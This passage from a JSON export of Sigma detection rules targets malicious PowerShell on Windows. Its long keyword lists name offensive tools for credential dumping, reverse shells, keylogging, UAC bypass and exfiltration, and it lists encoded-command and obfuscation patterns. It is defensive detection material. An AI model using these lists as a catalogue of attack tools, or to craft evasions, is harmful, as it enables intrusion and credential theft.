\\Invoke-BypassUAC.ps1\n    - \\Invoke-Carbuncle.ps1\n    - \\Invoke-Certify.ps1\n    - \\Invoke-ConPtyShell.ps1\n    - \\Invoke-CredentialInjection.ps1\n    - \\Invoke-CredentialsPhish.ps1\n    - \\Invoke-DAFT.ps1\n    - \\Invoke-DCSync.ps1\n    - \\Invoke-Decode.ps1\n    - \\Invoke-DinvokeKatz.ps1\n    - \\Invoke-DllInjection.ps1\n    - \\Invoke-DowngradeAccount.ps1\n    - \\Invoke-EgressCheck.ps1\n    - \\Invoke-Encode.ps1\n    - \\Invoke-EventViewer.ps1\n    - \\Invoke-Eyewitness.ps1\n    - \\Invoke-FakeLogonScreen.ps1\n    - \\Invoke-Farmer.ps1\n    - \\Invoke-Get-RBCD-Threaded.ps1\n    - \\Invoke-Gopher.ps1\n    - \\Invoke-Grouper2.ps1\n    - \\Invoke-Grouper3.ps1\n    - \\Invoke-HandleKatz.ps1\n    - \\Invoke-Interceptor.ps1\n    - \\Invoke-Internalmonologue.ps1\n    - \\Invoke-Inveigh.ps1\n    - \\Invoke-InveighRelay.ps1\n    - \\Invoke-JSRatRegsvr.ps1\n    - \\Invoke-JSRatRundll.ps1\n    - \\Invoke-KrbRelay.ps1\n    - \\Invoke-KrbRelayUp.ps1\n    - \\Invoke-LdapSignCheck.ps1\n    - \\Invoke-Lockless.ps1\n    - \\Invoke-MalSCCM.ps1\n    - \\Invoke-Mimikatz.ps1\n    - \\Invoke-MimikatzWDigestDowngrade.ps1\n    - \\Invoke-Mimikittenz.ps1\n    - \\Invoke-MITM6.ps1\n    - \\Invoke-NanoDump.ps1\n    - \\Invoke-NetRipper.ps1\n    - \\Invoke-NetworkRelay.ps1\n    - \\Invoke-NinjaCopy.ps1\n    - \\Invoke-OxidResolver.ps1\n    - \\Invoke-P0wnedshell.ps1\n    - \\Invoke-P0wnedshellx86.ps1\n    - \\Invoke-Paranoia.ps1\n    - \\Invoke-PortScan.ps1\n    - \\Invoke-PoshRatHttp.ps1\n    - \\Invoke-PoshRatHttps.ps1\n    - \\Invoke-PostExfil.ps1\n    - \\Invoke-PowerDump.ps1\n    - \\Invoke-PowerShellIcmp.ps1\n    - \\Invoke-PowerShellTCP.ps1\n    - \\Invoke-PowerShellTcpOneLine.ps1\n    - \\Invoke-PowerShellTcpOneLineBind.ps1\n    - \\Invoke-PowerShellUdp.ps1\n    - \\Invoke-PowerShellUdpOneLine.ps1\n    - \\Invoke-PowerShellWMI.ps1\n    - \\Invoke-PowerThIEf.ps1\n    - \\Invoke-PPLDump.ps1\n    - \\Invoke-Prasadhak.ps1\n    - \\Invoke-PsExec.ps1\n    - \\Invoke-PsGcat.ps1\n    - \\Invoke-PsGcatAgent.ps1\n    - \\Invoke-PSInject.ps1\n    - \\Invoke-PsUaCme.ps1\n    - \\Invoke-ReflectivePEInjection.ps1\n    - \\Invoke-ReverseDNSLookup.ps1\n    - \\Invoke-Rubeus.ps1\n    - \\Invoke-RunAs.ps1\n    - \\Invoke-SafetyKatz.ps1\n    - \\Invoke-SauronEye.ps1\n    - \\Invoke-SCShell.ps1\n    - \\Invoke-Seatbelt.ps1\n    - \\Invoke-ServiceAbuse.ps1\n    - \\Invoke-SessionGopher.ps1\n    - \\Invoke-ShellCode.ps1\n    - \\Invoke-SMBScanner.ps1\n    - \\Invoke-Snaffler.ps1\n    - \\Invoke-Spoolsample.ps1\n    - \\Invoke-SSHCommand.ps1\n    - \\Invoke-SSIDExfil.ps1\n    - \\Invoke-StandIn.ps1\n    - \\Invoke-StickyNotesExtract.ps1\n    - \\Invoke-Tater.ps1\n    - \\Invoke-Thunderfox.ps1\n    - \\Invoke-ThunderStruck.ps1\n    - \\Invoke-TokenManipulation.ps1\n    - \\Invoke-Tokenvator.ps1\n    - \\Invoke-TotalExec.ps1\n    - \\Invoke-UrbanBishop.ps1\n    - \\Invoke-UserHunter.ps1\n    - \\Invoke-VoiceTroll.ps1\n    - \\Invoke-Whisker.ps1\n    - \\Invoke-WinEnum.ps1\n    - \\Invoke-winPEAS.ps1\n    - \\Invoke-WireTap.ps1\n    - \\Invoke-WmiCommand.ps1\n    - \\Invoke-WScriptBypassUAC.ps1\n    - \\Invoke-Zerologon.ps1\n    - \\Keylogger.ps1\n    - \\MailRaider.ps1\n    - \\New-HoneyHash.ps1\n    - \\OfficeMemScraper.ps1\n    - \\Offline_Winpwn.ps1\n    - \\Out-CHM.ps1\n    - \\Out-DnsTxt.ps1\n    - \\Out-Excel.ps1\n    - \\Out-HTA.ps1\n    - \\Out-Java.ps1\n    - \\Out-JS.ps1\n    - \\Out-Minidump.ps1\n    - \\Out-RundllCommand.ps1\n    - \\Out-SCF.ps1\n    - \\Out-SCT.ps1\n    - \\Out-Shortcut.ps1\n    - \\Out-WebQuery.ps1\n    - \\Out-Word.ps1\n    - \\Parse_Keys.ps1\n    - \\Port-Scan.ps1\n    - \\PowerBreach.ps1\n    - \\powercat.ps1\n    - \\PowerRunAsSystem.psm1\n    - \\PowerSharpPack.ps1\n    - \\PowerUp.ps1\n    - \\PowerUpSQL.ps1\n    - \\PowerView.ps1\n    - \\PSAsyncShell.ps1\n    - \\RemoteHashRetrieval.ps1\n    - \\Remove-Persistence.ps1\n    - \\Remove-PoshRat.ps1\n    - \\Remove-Update.ps1\n    - \\Run-EXEonRemote.ps1\n    - \\Schtasks-Backdoor.ps1\n    - \\Set-DCShadowPermissions.ps1\n    - \\Set-MacAttribute.ps1\n    - \\Set-RemotePSRemoting.ps1\n    - \\Set-RemoteWMI.ps1\n    - \\Set-Wallpaper.ps1\n    - \\Show-TargetScreen.ps1\n    - \\Speak.ps1\n    - \\Start-CaptureServer.ps1\n    - \\Start-WebcamRecorder.ps1\n    - \\StringToBase64.ps1\n    - \\TexttoExe.ps1\n    - \\VolumeShadowCopyTools.ps1\n    - \\WinPwn.ps1\n    - \\WSUSpendu.ps1\n  selection_invoke_sharp:\n    TargetFilename|contains: Invoke-Sharp\n    TargetFilename|endswith: .ps1\nfalsepositives:\n- Unknown\nid: f331aa1f-8c53-4fc3-b083-cc159bc971cb\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://github.com/PowerShellMafia/PowerSploit\n- https://github.com/NetSPI/PowerUpSQL\n- https://github.com/CsEnox/EventViewer-UACBypass\n- https://github.com/AlsidOfficial/WSUSpendu/\n- https://github.com/nettitude/Invoke-PowerThIEf\n- https://github.com/S3cur3Th1sSh1t/WinPwn\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 41025fd7-0466-4650-a813-574aaacbe7f4\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Malicious PowerShell Scripts - FileCreation\n",
                            "sigma:id": "f331aa1f-8c53-4fc3-b083-cc159bc971cb",
                            "title": "Malicious PowerShell Scripts - FileCreation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
                        "lookup_data": {
                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/20\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection\n  selection:\n    Payload|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n  type: similar\n- id: 02030f2f-6199-49ec-b258-ea71b07e03dc\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - PoshModule\n",
                            "sigma:id": "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
                            "title": "Malicious PowerShell Commandlets - PoshModule",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "30e92f50-bb5a-4884-98b5-d20aa80f3d7a",
                        "lookup_data": {
                            "description": "Detects events that appear when a user click on a link file with a powershell command in it",
                            "raw": "author: frack113\ndate: 2022/02/06\ndescription: Detects events that appear when a user click on a link file with a powershell\n  command in it\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - powershell\n    - .lnk\n    Image: C:\\Windows\\System32\\cmd.exe\n    ParentImage: C:\\Windows\\explorer.exe\nfalsepositives:\n- Legitimate commands in .lnk files\nid: 30e92f50-bb5a-4884-98b5-d20aa80f3d7a\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.x86matthew.com/view_post?id=embed_exe_lnk\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Hidden Powershell in Link File Pattern\n",
                            "sigma:id": "30e92f50-bb5a-4884-98b5-d20aa80f3d7a",
                            "title": "Hidden Powershell in Link File Pattern",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bf72941a-cba0-41ea-b18c-9aca3925690d",
                        "lookup_data": {
                            "description": "Detects execution of ADRecon.ps1 for AD reconnaissance which has been reported to be actively used by FIN7",
                            "raw": "author: Bhabesh Raj\ndate: 2021/07/16\ndescription: Detects execution of ADRecon.ps1 for AD reconnaissance which has been\n  reported to be actively used by FIN7\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - Function Get-ADRExcelComOb\n    - Get-ADRGPO\n    - Get-ADRDomainController\n    - ADRecon-Report.xlsx\nfalsepositives:\n- Unknown\nid: bf72941a-cba0-41ea-b18c-9aca3925690d\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/09/06\nreferences:\n- https://github.com/sense-of-security/ADRecon/blob/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1\n- https://bi-zone.medium.com/from-pentest-to-apt-attack-cybercriminal-group-fin7-disguises-its-malware-as-an-ethical-hackers-c23c9a75e319\nstatus: experimental\ntags:\n- attack.discovery\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell ADRecon Execution\n",
                            "sigma:id": "bf72941a-cba0-41ea-b18c-9aca3925690d",
                            "title": "PowerShell ADRecon Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "56c217c3-2de2-479b-990f-5c109ba8458f",
                        "lookup_data": {
                            "description": "Detects the creation of a schtask via PowerSploit or Empire Default Configuration.",
                            "raw": "author: Markus Neis, @Karneades\ndate: 2018/03/06\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ONLOGON\n    - DAILY\n    - ONIDLE\n    - Updater\n    CommandLine|contains|all:\n    - /Create\n    - /SC\n    - /TN\n    - Updater\n    - /TR\n    - powershell\n    Image|endswith: \\schtasks.exe\n    ParentImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- False positives are possible, depends on organisation and processes\nid: 56c217c3-2de2-479b-990f-5c109ba8458f\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n- https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/powershell/persistence/userland/schtasks.py\nstatus: test\ntags:\n- attack.execution\n- attack.persistence\n- attack.privilege_escalation\n- attack.s0111\n- attack.g0022\n- attack.g0060\n- car.2013-08-001\n- attack.t1053.005\n- attack.t1059.001\ntitle: Default PowerSploit and Empire Schtasks Persistence\n",
                            "sigma:id": "56c217c3-2de2-479b-990f-5c109ba8458f",
                            "title": "Default PowerSploit and Empire Schtasks Persistence",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c",
                        "lookup_data": {
                            "description": "Detects PowerShell command line patterns in combincation with encoded commands that often appear in malware infection chains",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/05/24\ndescription: Detects PowerShell command line patterns in combincation with encoded\n  commands that often appear in malware infection chains\ndetection:\n  condition: all of selection_* and not 1 of filter_*\n  filter_gcworker:\n    ParentImage|contains:\n    - C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\n    - \\gc_worker.exe\n  selection_encoded:\n    CommandLine|contains:\n    - ' JAB'\n    - ' SUVYI'\n    - ' SQBFAFgA'\n    - ' aWV4I'\n    - ' IAB'\n    - ' PAA'\n    - ' aQBlAHgA'\n  selection_flags:\n    CommandLine|contains:\n    - ' -e '\n    - ' -en '\n    - ' -enc '\n    - ' -enco'\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.Exe\n    - pwsh.dll\nfalsepositives:\n- Other tools that work with encoded scripts in the command line instead of script\n  files\nid: b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://app.any.run/tasks/b9040c63-c140-479b-ad59-f1bb56ce7a97/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Encoded Command Patterns\n",
                            "sigma:id": "b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c",
                            "title": "Suspicious PowerShell Encoded Command Patterns",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e1561947-b4e3-4a74-9bdd-83baed21bdb5",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Clip.exe in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/09\ndescription: Detects Obfuscated Powershell via use Clip.exe in Scripts\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - clipboard\n    - invoke\n    - i`\n    - n`\n    - v`\n    - o`\n    - k`\n    - e`\n    CommandLine|contains|all:\n    - echo\n    - clip\n    - '&&'\nfalsepositives:\n- Unknown\nid: e1561947-b4e3-4a74-9bdd-83baed21bdb5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/16\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Clip\n",
                            "sigma:id": "e1561947-b4e3-4a74-9bdd-83baed21bdb5",
                            "title": "Invoke-Obfuscation Via Use Clip",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1a0a2ff1-611b-4dac-8216-8a7b47c618a6",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Clip.exe in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/09\ndescription: Detects Obfuscated Powershell via use Clip.exe in Scripts\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains: (Clipboard|i\nfalsepositives:\n- Unknown\nid: 1a0a2ff1-611b-4dac-8216-8a7b47c618a6\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 63e3365d-4824-42d8-8b82-e56810fefa0c\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Clip - Security\n",
                            "sigma:id": "1a0a2ff1-611b-4dac-8216-8a7b47c618a6",
                            "title": "Invoke-Obfuscation Via Use Clip - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "812837bb-b17f-45e9-8bd0-0ec35d2e3bd6",
                        "lookup_data": {
                            "description": "Detects suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands.",
                            "raw": "author: Teymur Kheirkhabarov, Harish Segar (rule)\ndate: 2020/06/29\ndescription: Detects suspicious powershell process which includes bxor command, alternative\n  obfuscation method to b64 encoded commands.\ndetection:\n  condition: selection and filter\n  filter:\n    HostApplication|contains:\n    - bxor\n    - join\n    - char\n  selection:\n    HostName: ConsoleHost\nfalsepositives:\n- Unknown\nid: 812837bb-b17f-45e9-8bd0-0ec35d2e3bd6\nlevel: medium\nlogsource:\n  category: ps_classic_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=46\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious XOR Encoded PowerShell Command Line - PowerShell\n",
                            "sigma:id": "812837bb-b17f-45e9-8bd0-0ec35d2e3bd6",
                            "title": "Suspicious XOR Encoded PowerShell Command Line - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                        "lookup_data": {
                            "description": "Detect run not allowed files. Applocker is a very useful tool, especially on servers where unprivileged users have access. For example terminal servers. You need configure applocker and log collect to receive these events.",
                            "raw": "author: Pushkarev Dmitry\ndate: 2020/06/28\ndescription: Detect run not allowed files. Applocker is a very useful tool, especially\n  on servers where unprivileged users have access. For example terminal servers. You\n  need configure applocker and log collect to receive these events.\ndetection:\n  condition: selection\n  selection:\n    EventID:\n    - 8004\n    - 8007\n    - 8022\n    - 8025\nfalsepositives:\n- Need tuning applocker or add exceptions in SIEM\nfields:\n- PolicyName\n- RuleId\n- RuleName\n- TargetUser\n- TargetProcessId\n- FilePath\n- FileHash\n- Fqbn\nid: 401e5d00-b944-11ea-8f9a-00163ecd60ae\nlevel: medium\nlogsource:\n  product: windows\n  service: applocker\nmodified: 2021/11/27\nreferences:\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/using-event-viewer-with-applocker\n- https://nxlog.co/documentation/nxlog-user-guide/applocker.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.006\n- attack.t1059.007\ntitle: File Was Not Allowed To Run\n",
                            "sigma:id": "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                            "title": "File Was Not Allowed To Run",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
                        "lookup_data": {
                            "description": "Detects usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell.",
                            "raw": "author: FPT.EagleEye, wagga\ndate: 2021/03/03\ndescription: Detects usage of the \"TcpClient\" class. Which can be abused to establish\n  remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\"\n  reverse shell.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - ' System.Net.Sockets.TCPClient'\n    - .GetBytes\n    - .Write\n  selection_img:\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- Administrative might use this function to check network connectivity\nid: edc2f8ae-2412-4dfd-b9d5-0c57727e70be\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/09\nreferences:\n- https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/\n- https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\n- https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellTcpOneLine.ps1\nstatus: stable\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Potential Powershell ReverseShell Connection\n",
                            "sigma:id": "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
                            "title": "Potential Powershell ReverseShell Connection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f0507c0f-a3a2-40f5-acc6-7f543c334993",
                        "lookup_data": {
                            "description": "Detects net use command combo which executes files from WebDAV server; seen in malicious LNK files",
                            "raw": "author: pH-T (Nextron Systems)\ndate: 2022/09/01\ndescription: Detects net use command combo which executes files from WebDAV server;\n  seen in malicious LNK files\ndetection:\n  condition: image and all of selection*\n  image:\n    Image|contains: \\cmd.exe\n  selection_base:\n    CommandLine|contains|all:\n    - ' net use http'\n    - '& start /b '\n    - \\DavWWWRoot\\\n  selection_ext:\n    CommandLine|contains:\n    - '.exe '\n    - '.dll '\n    - '.bat '\n    - '.vbs '\n    - '.ps1 '\nfalsepositives:\n- Unknown\nid: f0507c0f-a3a2-40f5-acc6-7f543c334993\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/ShadowChasing1/status/1552595370961944576\n- https://www.virustotal.com/gui/file/a63376ee1dba76361df73338928e528ca5b20171ea74c24581605366dcaa0104/behavior\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious Net Use Command Combo\n",
                            "sigma:id": "f0507c0f-a3a2-40f5-acc6-7f543c334993",
                            "title": "Suspicious Net Use Command Combo",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "03d83090-8cba-44a0-b02f-0b756a050306",
                        "lookup_data": {
                            "description": "Detects use of WinAPI Functions in PowerShell scripts",
                            "raw": "author: Nikita Nazarov, oscd.community, Tim Shelton\ndate: 2020/10/06\ndescription: Detects use of WinAPI Functions in PowerShell scripts\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_amazon:\n    ScriptBlockText|contains: 'function Import-SerialPortUtil '\n    ScriptBlockText|startswith: '# Copyright 2016 Amazon.com, Inc. or its affiliates.'\n  selection:\n    ScriptBlockText|contains:\n    - AddSecurityPackage\n    - AdjustTokenPrivileges\n    - Advapi32\n    - CloseHandle\n    - CreateProcessWithToken\n    - CreateRemoteThread\n    - CreateThread\n    - CreateUserThread\n    - DangerousGetHandle\n    - DuplicateTokenEx\n    - EnumerateSecurityPackages\n    - FreeLibrary\n    - GetDelegateForFunctionPointer\n    - GetLogonSessionData\n    - GetModuleHandle\n    - GetProcAddress\n    - GetProcessHandle\n    - GetTokenInformation\n    - ImpersonateLoggedOnUser\n    - kernel32\n    - LoadLibrary\n    - memcpy\n    - 